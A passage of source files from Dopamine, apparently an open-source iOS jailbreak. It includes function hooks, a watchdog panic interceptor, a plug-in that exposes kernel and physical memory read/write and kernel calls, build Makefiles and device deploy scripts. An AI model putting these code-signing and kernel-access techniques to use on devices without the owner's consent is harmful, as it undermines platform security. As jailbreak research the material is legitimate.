			const char *tweakLoaderPath = "/var/jb/usr/lib/TweakLoader.dylib";
			if (access(tweakLoaderPath, F_OK) == 0) {
				void *tweakLoaderHandle = dlopen(tweakLoaderPath, RTLD_NOW);
				if (tweakLoaderHandle != NULL) {
					dlclose(tweakLoaderHandle);
				}
			}
		}

#ifndef __arm64e__
		// Feeable attempt at adding back CS_VALID
		jbclient_cs_revalidate();
#endif
	}
}
```

`BaseBin/systemhook/src/private.h`:

```h
#ifndef SYSTEMHOOK_PRIVATE
#define SYSTEMHOOK_PRIVATE

#include <mach-o/dyld.h>

#define SYS_ptrace 0x1A
#define SYS_execve 0x3B
#define SYS_posix_spawn 0xF4
#define SYS_csops 0xA9
#define SYS_csops_audittoken 0xAA
#define SYS_necp_match_policy 0x1CC
#define SYS_necp_open 0x1F5
#define SYS_necp_client_action 0x1F6
#define SYS_necp_session_open 0x20A
#define SYS_necp_session_action 0x20B

int necp_match_policy(uint8_t *parameters, size_t parameters_size, void *returned_result);
int necp_open(int flags);
int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size);
int necp_session_open(int flags);
int necp_session_action(int necp_fd, uint32_t action, uint8_t *in_buffer, size_t in_buffer_length, uint8_t *out_buffer, size_t out_buffer_length);

int ptrace(int request, pid_t pid, caddr_t addr, int data);
#define PT_ATTACH       10      /* trace some running process */
#define PT_ATTACHEXC    14      /* attach to running process with signal exception */

#define POSIX_SPAWN_PROC_TYPE_DRIVER 0x700
int posix_spawnattr_getprocesstype_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.8), ios(6.0));

#define POSIX_SPAWNATTR_OFF_MEMLIMIT_ACTIVE 0x48
#define POSIX_SPAWNATTR_OFF_MEMLIMIT_INACTIVE 0x4C
#define POSIX_SPAWNATTR_OFF_LAUNCH_TYPE 0xA8

extern char **environ;

struct _posix_spawn_args_desc {
	size_t attr_size;
	posix_spawnattr_t attrp;
	
	size_t file_actions_size;
	void *file_actions;

	size_t port_actions_size;
	void *port_actions;

	size_t mac_extensions_size;
	void *mac_extensions;

	size_t coal_info_size;
	struct _posix_spawn_coalition_info *coal_info;

	size_t persona_info_size;
	void *persona_info;

	size_t posix_cred_info_size;
	void *posix_cred_info;

	size_t subsystem_root_path_size;
	char *subsystem_root_path;

	size_t conclave_id_size;
	char *conclave_id;
};

extern bool _dyld_get_image_uuid(const struct mach_header* mh, uuid_t uuid);

#endif
```

`BaseBin/systemhook/upload.sh`:

```sh
set -e

PROJECT_NAME=systemhook.dylib
DEVICE=root@localhost
PORT=2223

make
ssh $DEVICE -p $PORT "rm -rf /var/jb/$PROJECT_NAME"
scp -P$PORT ./$PROJECT_NAME $DEVICE:/var/jb/$PROJECT_NAME
ssh $DEVICE -p $PORT "/var/jb/basebin/jbctl rebuild_trustcache"
```

`BaseBin/watchdoghook/Makefile`:

```
TARGET = watchdoghook.dylib
CC = clang

CFLAGS = -framework Foundation -framework CoreServices -framework Security -I../.include -I./src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -fobjc-arc -O2
LDFLAGS = -dynamiclib -rpath /var/jb/Library/Frameworks -rpath @loader_path/fallback -L../_external/lib -lellekit -framework IOKit

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.m src/*.c ../libjailbreak/src/jbclient_*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/watchdoghook/src/main.m`:

```m
#include <mach-o/dyld.h>
#include <dlfcn.h>
#include <xpc/xpc.h>
#include <IOKit/IOKitLib.h>
#include <libjailbreak/jbclient_xpc.h>

#include <substrate.h>

int reboot3(uint64_t flags, ...);
#define RB2_USERREBOOT (0x2000000000000000llu)

kern_return_t (*IOConnectCallStructMethod_orig)(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt) = NULL;
kern_return_t (*IOServiceOpen_orig)(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
mach_port_t gIOWatchdogConnection = MACH_PORT_NULL;

kern_return_t IOServiceOpen_hook(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect)
{
	kern_return_t orig = IOServiceOpen_orig(service, owningTask, type, connect);
	if (orig == KERN_SUCCESS && connect) {
		if (IOObjectConformsTo(service, "IOWatchdog")) {
			// save mach port of IOWatchdog for check later
			gIOWatchdogConnection = *connect;
		}
	}
	return orig;
}

kern_return_t IOConnectCallStructMethod_hook(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt)
{
	if (connection == gIOWatchdogConnection) {
		if (selector == 2) {
			int r = jbclient_watchdog_intercept_userspace_panic((const char *)inputStruct);
			if (r == 0) {
				reboot3(RB2_USERREBOOT);
			}
			return r;
		}
	}
	return IOConnectCallStructMethod_orig(connection, selector, inputStruct, inputStructCnt, outputStruct, outputStructCnt);
}

__attribute__((constructor)) static void initializer(void)
{
	MSHookFunction(IOServiceOpen, (void *)&IOServiceOpen_hook, (void **)&IOServiceOpen_orig);
	MSHookFunction(IOConnectCallStructMethod, (void *)&IOConnectCallStructMethod_hook, (void **)&IOConnectCallStructMethod_orig);
}
```

`LICENSE.md`:

```md
MIT License

Copyright (c) 2023-2024 Lars Fröder (opa334)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Makefile`:

```
export NIGHTLY ?= 0

ifeq ($(NIGHTLY), 1)
export COMMIT_HASH = $(shell git rev-parse HEAD)
endif

all:
	@$(MAKE) -C BaseBin
	@$(MAKE) -C Packages
	@$(MAKE) -C Application

clean:
	@$(MAKE) -C BaseBin clean
	@$(MAKE) -C Packages clean
	@$(MAKE) -C Application clean

update: all
	ssh $(DEVICE) "rm -rf /var/mobile/Documents/Dopamine.tipa"
	scp -C ./Application/Dopamine.tipa "$(DEVICE):/var/mobile/Documents/Dopamine.tipa"
	ssh $(DEVICE) "/var/jb/basebin/jbctl update tipa /var/mobile/Documents/Dopamine.tipa"

update-basebin: all
	ssh $(DEVICE) "rm -rf /var/mobile/Documents/basebin.tar"
	scp -C ./BaseBin/basebin.tar "$(DEVICE):/var/mobile/Documents/basebin.tar"
	ssh $(DEVICE) "/var/jb/basebin/jbctl update basebin /var/mobile/Documents/basebin.tar"

.PHONY: update clean
```

`Packages/Makefile`:

```
all:
	@$(MAKE) -C libkrw-provider package
	@$(MAKE) -C libroot package
	@$(MAKE) -C basebin-link package

clean:
	@$(MAKE) -C libkrw-provider clean
	@$(MAKE) -C libroot clean
	@$(MAKE) -C basebin-link clean

.PHONY: clean
```

`Packages/basebin-link/Makefile`:

```
package: $(TARGET)
	@mkdir -p .package/DEBIAN
	@mkdir -p .package/var/jb/usr/bin
	@mkdir -p .package/var/jb/usr/lib
	@cp control .package/DEBIAN/control
	@ln -s ../../basebin/jbctl .package/var/jb/usr/bin/jbctl
	@ln -s ../../basebin/opainject .package/var/jb/usr/bin/opainject
	@ln -s ../../basebin/libjailbreak.dylib .package/var/jb/usr/lib/libjailbreak.dylib
	@dpkg-deb --root-owner-group -Zzstd -b .package ./basebin-link.deb
	@rm -rf .package

clean:
	@rm -rf basebin-link.deb
```

`Packages/basebin-link/control`:

```
Package: dopamine-basebin-link
Name: Dopamine BaseBin Link
Author: opa334 <opa334@protonmail.com>
Maintainer: opa334 <opa334@protonmail.com>
Architecture: iphoneos-arm64
Version: 1.0.0
Provides: opainject
Section: Libraries
Priority: standard
Homepage: https://github.com/opa334/Dopamine/tree/main/BaseBin
Description: Symlinks to Dopamine Base Binaries

```

`Packages/libkrw-provider/Makefile`:

```
TARGET = libkrw-dopamine.dylib
CC = clang

CFLAGS = -I../../BaseBin/.include -Isrc -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -fobjc-arc -O2
LDFLAGS = -dynamiclib -rpath /var/jb/usr/lib -L../../BaseBin/.build -ljailbreak

all: $(TARGET) sign

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^
	install_name_tool -change "@loader_path/libjailbreak.dylib" "@rpath/libjailbreak.dylib" $@

clean:
	@rm -f $(TARGET)
	@rm -f libkrw-dopamine.deb

package: all
	@mkdir -p .package/DEBIAN
	@mkdir -p .package/var/jb/usr/lib/libkrw
	@cp control .package/DEBIAN/control
	@cp libkrw-dopamine.dylib .package/var/jb/usr/lib/libkrw/libkrw-dopamine.dylib
	@dpkg-deb --root-owner-group -Zzstd -b .package ./libkrw-dopamine.deb
	@rm -rf .package

```

`Packages/libkrw-provider/control`:

```
Package: libkrw0-dopamine
Name: libkrw Plug-in (Dopamine)
Author: opa334 <opa334@protonmail.com>
Maintainer: opa334 <opa334@protonmail.com>
Architecture: iphoneos-arm64
Version: 2.0.4
Provides: libkrw0-plugin
Depends: libiosexec1 (>= 1.3.1)
Section: Libraries
Priority: standard
Homepage: https://github.com/opa334/Dopamine/tree/main/Packages/libkrw-provider
Description: libkrw Plug-in for Dopamine (Shared Library)

```

`Packages/libkrw-provider/src/main.c`:

```c
#include <libjailbreak/libjailbreak.h>
#include <libkrw/libkrw_plugin.h>
#include <dispatch/dispatch.h>
#include <errno.h>

static void load_primitives_once(void)
{
	static dispatch_once_t onceToken;
	dispatch_once (&onceToken, ^{
		jbclient_initialize_primitives();
	});
}

static int kwritebuf_wrapper(void *from, uint64_t to, size_t len)
{
	return kwritebuf(to, from, len);
}

static int kcall_wrapper(uint64_t func, size_t argc, const uint64_t *argv, uint64_t *ret)
{
	if (is_kcall_available()) {
		return kcall(ret, func, argc, argv);
	}
	return ENOTSUP;
}

static int physreadbuf_wrapper(uint64_t from, void *to, size_t len, uint8_t granule)
{
	return physreadbuf(from, to, len);
}

static int physwritebuf_wrapper(void *from, uint64_t to, size_t len, uint8_t granule)
{
	return physwritebuf(to, from, len);
}

static int kbase_wrapper(uint64_t *kbase)
{
	*kbase = kconstant(base);
	return 0;
}

__attribute__((used)) int krw_initializer(krw_handlers_t handlers)
{
	load_primitives_once();

	handlers->kbase = kbase_wrapper;
	handlers->kread = kreadbuf;
	handlers->kwrite = kwritebuf_wrapper;
	handlers->kmalloc = (krw_kmalloc_func_t)(kalloc);
	handlers->kdealloc = (krw_kdealloc_func_t)(kfree);
	return 0;
}

__attribute__((used)) int kcall_initializer(krw_handlers_t handlers)
{
	load_primitives_once();

	handlers->kcall = kcall_wrapper;
	handlers->physread = physreadbuf_wrapper;
	handlers->physwrite = physwritebuf_wrapper;
	return 0;
}
```

`Packages/libroot/Makefile`:

```
TARGET = libroot.dylib
CC = clang

CFLAGS = -I../../BaseBin/.include -Isrc -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -fobjc-arc -O2
LDFLAGS = -dynamiclib -rpath /var/jb

all: $(TARGET) sign

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.c ../../BaseBin/libjailbreak/src/jbclient_*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)
	@rm -f libroot.deb

package: all
	@mkdir -p .package/DEBIAN
	@mkdir -p .package/var/jb/usr/lib
	@cp control .package/DEBIAN/control
	@cp libroot.dylib .package/var/jb/usr/lib/libroot.dylib
	@dpkg-deb --root-owner-group -Zzstd -b .package ./libroot.deb
	@rm -rf .package
```

`Packages/libroot/control`:

```
Package: libroot-dopamine
Name: libroot (Dopamine)
Author: opa334
Maintainer: opa334
Architecture: iphoneos-arm64
Version: 1.0.1
Priority: optional
Section: Development
Description: libroot for Dopamine

```

`Packages/libroot/src/paths.c`:

```c
#include <libjailbreak/jbclient_xpc.h>

const char *libroot_get_root_prefix(void)
{
	return "";
}

const char *libroot_get_jbroot_prefix(void)
{
	return jbclient_get_jbroot();
}

const char *libroot_get_boot_uuid(void)
{
	return jbclient_get_boot_uuid();
}

```

`Packages/libroot/src/paths.h`:

```h
#ifndef LIBROOT_PATHS_H
#define LIBROOT_PATHS_H

const char *libroot_get_root_prefix(void);
const char *libroot_get_jbroot_prefix(void);
const char *libroot_get_boot_uuid(void);

#endif
```

`README.md`:

```md
<img src="https://github.com/opa334/Dopamine/assets/52459150/ed04dd3e-d879-456d-9aa3-d4ed44819c7e" width="64" />

# Dopamine

A rootless semi-untethered jailbreak for iOS 15.0 - 16.5.1 (arm64e) and iOS 15.0 - 16.6.1 (arm64). More details will follow here soon.

Please note that all issues related to version support will be deleted without response.

Official website / download: https://ellekit.space/dopamine/

```

`sort_localizations.sh`:

```sh
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/ar.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/da.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/de.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/el.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/es.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/fil.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/fr.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/it.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/ja.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/ko.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/kk.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/nl.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/pl.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/pt-BR.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/ru.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/sv.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/th.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/tr.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/uk.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/ur.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/vi.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/zh-CN.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/zh-Hans.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/zh-HK.lproj/Localizable.strings -r
localisort -t ./Application/Dopamine/en.lproj/Localizable.strings -i ./Application/Dopamine/zh-TW.lproj/Localizable.strings -r

```